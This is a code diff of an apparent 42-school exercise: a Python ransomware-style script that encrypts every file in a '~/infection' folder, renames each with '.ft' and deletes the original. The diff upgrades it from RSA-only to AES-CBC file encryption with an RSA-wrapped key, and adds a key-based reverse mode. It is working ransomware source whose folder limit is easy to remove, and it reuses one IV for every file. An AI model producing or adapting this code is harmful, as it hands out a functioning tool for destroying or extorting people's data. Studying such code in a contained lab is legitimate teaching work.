@@ -6,7 +6,7 @@
 #    By: guferrei <guferrei@student.42sp.org.br>    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2025/02/14 21:33:17 by guferrei          #+#    #+#              #
-#    Updated: 2025/02/18 16:03:28 by guferrei         ###   ########.fr        #
+#    Updated: 2025/02/24 15:55:11 by guferrei         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -14,6 +14,7 @@ import argparse, glob, os
 from os.path import expanduser
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import padding
+from Crypto.Cipher import AES
 
 PATH = expanduser("~") + "/infection"
 PUBLIC_KEY = b"""-----BEGIN PUBLIC KEY-----
@@ -50,31 +51,46 @@ def load_file_content(file):
 		return data
 
 
-def encrypt(file, public_key, args):
+def pad(data):
+	padding_length = 16 - len(data) % 16
+	padding = bytes([padding_length] * padding_length)
+	return data + padding
+
+def encrypt_key(public_key, aes_key):
+	ciphertext = public_key.encrypt(
+			aes_key,
+			padding.OAEP(
+				mgf=padding.MGF1(algorithm=hashes.SHA256()),
+				algorithm=hashes.SHA256(),
+				label=None
+			)
+		)
+	with open(PATH + "/key.pem", 'wb') as f:
+		f.write(ciphertext)
+
+
+def encrypt_file(file, key, iv, args):
 	if not args.silent:
 		print("ecrypting file {}...".format(file))
 	plaintext = load_file_content(file)
-
-	if plaintext:
-		try:
-			ciphertext = public_key.encrypt(
-				plaintext,
-				padding.OAEP(
-					mgf=padding.MGF1(algorithm=hashes.SHA256()),
-					algorithm=hashes.SHA256(),
-					label=None
-				)
-			)
-		except:
-			raise Exception()
-
-		with open(file+'.ft', 'wb') as f:
-			f.write(ciphertext)
-		os.remove(file)
+	padded_plaintext = pad(plaintext)
+	cipher = AES.new(key, AES.MODE_CBC, iv)
+ 
+	ciphertext = cipher.encrypt(padded_plaintext)
+	with open(file+'.ft', 'wb') as f:
+		f.write(iv + ciphertext)
+	os.remove(file)
 
 
-def decrypt(file, private_key):
-	ciphertext = load_file_content(file)
+def unpad(data):
+	padding_length = data[-1]
+	if padding_length < 1 or padding_length > 16:
+		raise ValueError("Invalid padding encountered")
+	return data[:-padding_length]
+
+
+def decrypt_key(private_key):
+	ciphertext = load_file_content(PATH + "/key.pem")
 	if ciphertext:
 		try:
 			plaintext = private_key.decrypt(
@@ -85,12 +101,21 @@ def decrypt(file, private_key):
 					label=None
 				)
 			)
+			return plaintext
 		except:
 			raise Exception
 
-		with open(file.removesuffix('.ft'), 'wb') as f:
-			f.write(plaintext)
-		os.remove(file)
+
+def decrypt_file(file, key):
+	with open(file, 'rb') as f:
+		iv = f.read(16)
+		ciphertext = f.read()
+	cipher = AES.new(key, AES.MODE_CBC, iv)
+	plaintext = cipher.decrypt(ciphertext)
+	decrypted_data = unpad(plaintext)
+	with open(file.removesuffix('.ft'), 'wb') as f:
+		f.write(decrypted_data)
+	os.remove(file)
 
 
 def reverse(key: str, args):
@@ -101,15 +126,18 @@ def reverse(key: str, args):
 		print("Private key is invalid. Decryption failed!!")
 		return
 
+
 	for file in file_list:
 		try:
-			decrypt(file, private_key)
+			key = decrypt_key(private_key)
+			decrypt_file(file, key)
 		except:
 			if not args.silent:
 				print("File Decryption Failed! This is not the right private key")
 			return
 	if not args.silent:
 		print("Decryption Successful")
+	os.remove(PATH + "/key.pem")
 
 
 def run(args):
@@ -121,9 +149,13 @@ def run(args):
 			print("Public key is invalid. Generate a valid 1024 bit public key!!!")
 		return
 
+	key = os.urandom(32)
+	iv = os.urandom(16)
+	encrypt_key(public_key, key)
+
 	for file in file_list:
 		try:
-			encrypt(file, public_key, args)
+			encrypt_file(file, key, iv, args)
 		except:
 			if not args.silent:
 				print("File Encryption Failed! Make sure you are using an RSA public key of at least 1024 bits")
